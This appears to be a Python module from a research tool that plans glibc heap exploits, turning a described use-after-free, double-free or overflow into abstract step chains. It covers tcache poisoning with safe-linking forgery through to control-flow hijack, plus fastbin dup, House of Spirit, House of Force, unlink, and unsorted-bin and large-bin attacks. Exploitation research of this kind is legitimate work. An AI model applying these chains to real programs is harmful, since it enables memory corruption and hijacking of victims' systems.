"""Heap-vuln -> primitive chaining (Phase 9 frontier, AAHEG-style, analyst-in-the-loop).

Given a described heap vulnerability (use-after-free / double-free / heap overflow), the
allocator environment (glibc version, tcache), and a goal (arbitrary allocation, arbitrary
write, or control-flow hijack), pick an applicable exploitation **technique** and emit the
full step-by-step chain. The tcache-poisoning technique is fully generated (grooming +
safe-linking fd forge + the write + the trigger); other techniques (fastbin dup, unlink,
House-of-*) are a knowledge base with preconditions + the primitive they yield, surfaced as
analyst-guided outlines.

Deterministic and offline. Emitting the chain is the tool's job; mapping its abstract ops
onto a specific target's alloc/free/use interface is the analyst-in-the-loop step (doc 15).
"""
from __future__ import annotations

from dataclasses import dataclass

from .heap import in_tcache_range, is_fastbin, mangle, request2size, tcache_index


@dataclass
class Vuln:
    vclass: str                       # "uaf" | "double_free" | "heap_overflow"
    size: int = 24                    # the vulnerable allocation's request size
    note: str = ""


@dataclass
class Goal:
    kind: str                         # "arbitrary_alloc" | "arbitrary_write" | "control_flow"
    target: int = 0                   # address to allocate-over / write to / the fn pointer
    value: int = 0                    # value to write / code address to transfer to
    trigger: str = ""                 # how the target is used (e.g. "call the fn pointer")


@dataclass
class Env:
    glibc: tuple = (2, 42)
    tcache: bool = True
    has_leak: bool = True             # arbitrary addresses assume a leak (PIE/heap/libc)


# --------------------------------------------------------------- technique knowledge base
def _ver_ge(a, b):
    return a >= b


def _tcache_applies(v: Vuln, e: Env) -> bool:
    return (e.tcache and v.vclass in ("uaf", "double_free", "heap_overflow")
            and in_tcache_range(request2size(v.size)) and _ver_ge(e.glibc, (2, 26)))


def _tcache_chain(v: Vuln, g: Goal, e: Env) -> dict:
    """Full tcache-poisoning chain to `g` (allocate over target, then write/trigger)."""
    cs = request2size(v.size)
    safe_link = _ver_ge(e.glibc, (2, 32))
    steps = [
        {"op": "alloc", "handle": "A", "size": v.size, "note": "victim size-class"},
        {"op": "alloc", "handle": "B", "size": v.size},
        {"op": "free", "handle": "B"},
        {"op": "free", "handle": "A", "note": "tcache head is now A (LIFO)"},
    ]
    forge = ("mangle(addr(A), TARGET)  # safe-linking: (addr(A)>>12) ^ TARGET"
             if safe_link else "TARGET  # no safe-linking (glibc<2.32)")
    if v.vclass == "double_free" and _ver_ge(e.glibc, (2, 29)):
        steps.append({"op": "note", "detail": "glibc>=2.29 tcache double-free key check: "
                      "prefer the UAF write below over free(A);free(A)."})
    steps.append({"op": "write_fd", "handle": "A", "value": forge,
                  "detail": "the heap vuln overwrites the freed chunk A's forward pointer"})
    steps.append({"op": "alloc", "handle": "_", "size": v.size, "note": "returns A"})
    steps.append({"op": "alloc", "handle": "OUT", "size": v.size,
                  "note": "returns TARGET -- arbitrary allocation"})
    primitive = "arbitrary allocation"
    if g.kind in ("arbitrary_write", "control_flow"):
        steps.append({"op": "write", "handle": "OUT", "value": "VALUE",
                      "detail": "write attacker data into the chunk that overlaps TARGET"})
        primitive = "arbitrary write"
    if g.kind == "control_flow":
        steps.append({"op": "trigger", "detail": g.trigger or
                      "cause the program to use TARGET (call the overwritten pointer)"})
        primitive = "control-flow hijack"
    return {
        "ok": True, "technique": "tcache_poisoning", "auto": True, "primitive": primitive,
        "chunk_size": cs, "tcache_index": tcache_index(cs), "safe_linking": safe_link,
        "steps": steps, "mangle": mangle, "target": g.target, "value": g.value,
        "notes": [
            f"TARGET ({hex(g.target)}) must be 16-byte aligned (tcache alignment check).",
            "TARGET/VALUE are concrete addresses -- supply them from symbols (no-PIE) or a "
            "leak (PIE/heap/libc).",
        ],
    }


# --------------------------------------------------------------- generated advisory chains
# Each generator emits the concrete op sequence for a classic heap technique (not just a
# prose outline). Unlike tcache poisoning -- fully auto and push-button -- these still need an
# analyst-supplied fake chunk, a leak, or a specific glibc, so they are *generated-but-
# advisory*: honest chains, analyst-in-the-loop. `confirmed` marks the ones whose mechanics we
# live-verify against the host's real glibc in the test suite (see tests/test_aaheg.py).

def _fill_tcache(size):
    return {"op": "groom", "detail": f"alloc 7 then free 7 chunks of size {size} to fill "
            "that size-class's tcache bin, so the next frees reach the fastbin (glibc>=2.26)"}


def _fastbin_dup(v: Vuln, g: Goal, e: Env):
    cs = request2size(v.size)
    safe = _ver_ge(e.glibc, (2, 32))
    fd = ("mangle(addr(A), FAKE)  # fastbins are safe-linked in glibc>=2.32"
          if safe else "FAKE  # no safe-linking (glibc<2.32)")
    steps = [
        _fill_tcache(v.size),
        {"op": "alloc", "handle": "A", "size": v.size},
        {"op": "alloc", "handle": "B", "size": v.size},
        {"op": "free", "handle": "A", "note": "fastbin head = A"},
        {"op": "free", "handle": "B", "note": "head = B, so free(A) next passes the fasttop "
         "double-free check (head != A)"},
        {"op": "free", "handle": "A", "note": "A is now double-listed: A -> B -> A"},
        {"op": "alloc", "handle": "_", "size": v.size, "note": "returns A"},
        {"op": "write_fd", "handle": "A", "value": fd,
         "detail": f"forge A.fd -> FAKE (a fake chunk whose size field == {hex(cs)}: the "
         "fastbin size check compares it to the bin index)"},
        {"op": "alloc", "handle": "__", "size": v.size, "note": "returns B"},
        {"op": "alloc", "handle": "___", "size": v.size, "note": "returns A (2nd time)"},
        {"op": "alloc", "handle": "OUT", "size": v.size, "note": "returns FAKE"},
    ]
    return steps, ["fastbin-size chunk (chunk 0x20..0x80)",
                   f"a fake chunk near TARGET with size field == {hex(cs)} at TARGET-0x8",
                   "fill the tcache first so frees reach the fastbin"]


def _house_of_spirit(v: Vuln, g: Goal, e: Env):
    cs = request2size(v.size)
    fast = is_fastbin(cs)                        # only the fastbin path checks the next size
    steps = [
        {"op": "forge", "detail": f"in controlled memory build a fake chunk: size field = "
         f"{hex(cs | 1)} ({hex(cs)} | PREV_INUSE), 16-byte aligned user pointer"},
        {"op": "forge", "detail": f"set the *next* chunk's size (at +{hex(cs)}) to a sane "
         "value, e.g. 0x21, to pass the next-size sanity check", "optional": not fast},
        {"op": "free", "handle": "FAKE", "detail": "free(&fake.userdata) -- the fake chunk "
         f"enters the {'fastbin' if is_fastbin(cs) else 'tcache'}"},
        {"op": "alloc", "handle": "OUT", "size": v.size,
         "note": "returns &fake.userdata -- an allocation over attacker-controlled memory"},
    ]
    return steps, [f"a writable region you can forge a {hex(cs)} chunk header in",
                   "the fake user pointer must be 16-byte aligned",
                   "yields a chunk overlapping controlled memory (then write through it)"]


def _house_of_force(v: Vuln, g: Goal, e: Env):
    steps = [
        {"op": "overflow", "detail": "overflow the top chunk's size field to "
         "0xffffffffffffffff (SIZE_MAX)"},
        {"op": "alloc", "handle": "_", "size": "(TARGET - &top_user - 2*SIZE_SZ) as unsigned",
         "note": "the huge request moves the top chunk to just below TARGET"},
        {"op": "alloc", "handle": "OUT", "size": v.size, "note": "returns TARGET"},
    ]
    return steps, ["glibc<2.29 (a top-size check removed this in 2.29)",
                   "a heap-base leak to compute the malloc delta"]


def _unlink(v: Vuln, g: Goal, e: Env):
    steps = [
        {"op": "note", "detail": "P is a program pointer (at &P) that points to a chunk you "
         "control -- the overflow source."},
        {"op": "forge", "detail": "inside P's chunk build a fake free chunk: fd = &P - 0x18, "
         "bk = &P - 0x10 (so fd->bk == P and bk->fd == P, passing the unlink consistency "
         "check)"},
        {"op": "overflow", "detail": "overflow the *next* chunk: set prev_size = the fake "
         "chunk's size and clear its PREV_INUSE bit"},
        {"op": "free", "handle": "NEXT", "detail": "free(next) back-coalesces and unlink()s "
         "the fake chunk, writing (&P - 0x18) into P"},
        {"op": "write", "handle": "P", "detail": "P now points 0x18 before itself; writing "
         "through P overwrites P (and neighbours) with attacker data"},
    ]
    return steps, ["heap overflow into an adjacent chunk",
                   "a known pointer &P to a controlled chunk",
                   "passes the modern fd/bk consistency check"]


def _unsorted_bin_attack(v: Vuln, g: Goal, e: Env):
    steps = [
        {"op": "alloc", "handle": "V", "size": v.size, "note": "small (non-fast) chunk"},
        {"op": "alloc", "handle": "GUARD", "size": v.size,
         "note": "prevents V from consolidating with the top chunk when freed"},
        {"op": "free", "handle": "V", "note": "V enters the unsorted bin"},
        {"op": "write_bk", "handle": "V", "value": "TARGET - 0x10",
         "detail": "corrupt V.bk (UAF/overflow) so the unsorted-bin unlink writes to TARGET"},
        {"op": "alloc", "handle": "_", "size": v.size,
         "note": "the malloc scans the unsorted bin and writes &main_arena.bins[..] to TARGET"},
    ]
    return steps, ["non-fastbin (small) size",
                   "writes an unchosen libc (main_arena) VALUE, not an arbitrary one",
                   "glibc>=2.29 added a bk-integrity check -- pair with a large-bin attack"]


def _large_bin_attack(v: Vuln, g: Goal, e: Env):
    steps = [
        {"op": "alloc", "handle": "L1", "size": v.size, "note": "large-bin size"},
        {"op": "alloc", "handle": "G1", "size": v.size, "note": "guard (blocks consolidation)"},
        {"op": "alloc", "handle": "L2", "size": max(v.size - 0x20, 0x400),
         "note": "slightly smaller so it sorts ahead of L1 by nextsize"},
        {"op": "alloc", "handle": "G2", "size": v.size, "note": "guard"},
        {"op": "free", "handle": "L1"},
        {"op": "alloc", "handle": "_", "size": v.size + 0x1000, "note": "sorts L1 into its "
         "large bin"},
        {"op": "write_nextsize", "handle": "L1", "value": "TARGET - 0x20",
         "detail": "corrupt L1.bk_nextsize (and L1.bk = TARGET-0x10) via the vuln"},
        {"op": "free", "handle": "L2"},
        {"op": "alloc", "handle": "__", "size": v.size + 0x1000,
         "note": "inserting L2 into the large bin writes &L2 to L1.bk_nextsize+0x20 == TARGET"},
    ]
    return steps, ["large-bin size (chunk >= 0x400)",
                   "writes a heap address (&L2) to TARGET",
                   "the modern controlled-write go-to (glibc>=2.30)"]


# advisory techniques: preconditions, the primitive yielded, and a full generated chain.
_ADVISORY = [
    {"technique": "fastbin_dup", "primitive": "arbitrary allocation",
     "applies": lambda v, e: v.vclass in ("double_free", "uaf")
     and 0x20 <= request2size(v.size) <= 0x80,
     "build": _fastbin_dup, "confirmed": True,
     "summary": "double-free a fastbin chunk (bypass the fasttop check by cycling a 2nd "
                "chunk), then forge the dup'd chunk's fd to a fake chunk near the target."},
    {"technique": "house_of_spirit", "primitive": "arbitrary allocation",
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow"),
     "build": _house_of_spirit, "confirmed": True,
     "summary": "free() a forged chunk header over attacker-controlled memory, then malloc "
                "returns it."},
    {"technique": "unlink", "primitive": "write a pointer to &(P) (near-arbitrary write)",
     "applies": lambda v, e: v.vclass == "heap_overflow",
     "build": _unlink,
     "summary": "overflow size/prev_size + fd/bk of a free chunk so unlink() (on coalesce) "
                "writes &P-0x18 over a pointer P."},
    {"technique": "house_of_force", "primitive": "arbitrary allocation",
     "applies": lambda v, e: v.vclass == "heap_overflow" and not _ver_ge(e.glibc, (2, 29)),
     "build": _house_of_force,
     "summary": "overflow the top chunk's size to SIZE_MAX, then malloc a computed size to "
                "move the top to an arbitrary address (removed by the 2.29 top-size check)."},
    {"technique": "unsorted_bin_attack",
     "primitive": "write a libc (main_arena) address to a chosen location",
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow")
     and not is_fastbin(request2size(v.size)),
     "build": _unsorted_bin_attack,
     "summary": "corrupt a free unsorted-bin chunk's bk to (TARGET-0x10); the next malloc "
                "scanning it writes &main_arena.bins[..] to TARGET."},
    {"technique": "large_bin_attack",
     "primitive": "write a heap/controlled address to a chosen location",
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow")
     and request2size(v.size) >= 0x400,
     "build": _large_bin_attack,
     "summary": "two large chunks in one large bin; corrupt the first's bk_nextsize so "
                "inserting the second writes its address to TARGET (bk_nextsize+0x20)."},
]


TECHNIQUES = [
    {"technique": "tcache_poisoning", "primitive": "arbitrary allocation",
     "applies": _tcache_applies, "build": _tcache_chain, "auto": True},
]


def _advisory_for(vuln: Vuln, env: Env) -> list:
    """Generated advisory chains applicable to `vuln`/`env` (each carries its full op-chain,
    preconditions, and whether its mechanics are live-confirmed on the host glibc)."""
    out = []
    for t in _ADVISORY:
        if not t["applies"](vuln, env):
            continue
        steps, precond = t["build"](vuln, Goal("arbitrary_alloc"), env)
        out.append({"technique": t["technique"], "primitive": t["primitive"],
                    "outline": t["summary"], "generated": True, "auto": False,
                    "confirmed_on_real_glibc": t.get("confirmed", False),
                    "steps": steps, "preconditions": precond})
    return out


def plan_exploit(vuln: Vuln, goal: Goal, env: Env | None = None) -> dict:
    """Select a technique for `vuln` that achieves `goal` under `env`, and emit its chain.
    Returns the auto-generated chain when one applies, plus any advisory alternatives -- each
    of which now carries its own generated op-chain (not just an outline)."""
    env = env or Env()
    advisory = _advisory_for(vuln, env)
    for t in TECHNIQUES:
        if t["applies"](vuln, env):
            chain = t["build"](vuln, goal, env)
            chain["advisory_alternatives"] = advisory
            chain["vuln"] = {"class": vuln.vclass, "size": vuln.size}
            chain["goal"] = {"kind": goal.kind, "target": hex(goal.target),
                             "value": hex(goal.value)}
            return chain
    if advisory:
        return {"ok": False, "reason": "no auto-generated (push-button) technique applies; "
                "generated analyst-guided chains below", "advisory_alternatives": advisory}
    return {"ok": False, "reason": f"no known heap technique for {vuln.vclass} under "
            f"glibc {env.glibc}"}
